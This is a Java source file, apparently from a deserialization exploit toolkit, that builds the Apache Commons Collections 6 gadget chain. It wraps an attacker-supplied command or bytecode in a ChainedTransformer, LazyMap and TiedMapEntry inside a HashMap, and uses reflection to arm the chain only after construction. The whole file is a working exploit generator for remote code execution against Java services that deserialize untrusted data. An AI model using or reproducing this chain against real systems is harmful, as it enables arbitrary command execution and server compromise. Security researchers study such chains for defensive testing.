package com.chave.gadget.chain;

import com.chave.gadget.factory.TransformerArrayFactory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;

public class CommonsCollections6_Array {

    // 传入payload {"类名", "字节码/命令"}
    public static Object getObject(String TransformerArrayType, String[] payload) throws NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = TransformerArrayFactory.getTransformerArray(TransformerArrayType, payload);
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), "1");
        tiedMapEntry.hashCode();

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, null);

        Field mapField = TiedMapEntry.class.getDeclaredField("map");
        mapField.setAccessible(true);
        mapField.set(tiedMapEntry, lazyMap);

        return hashMap;
    }
}
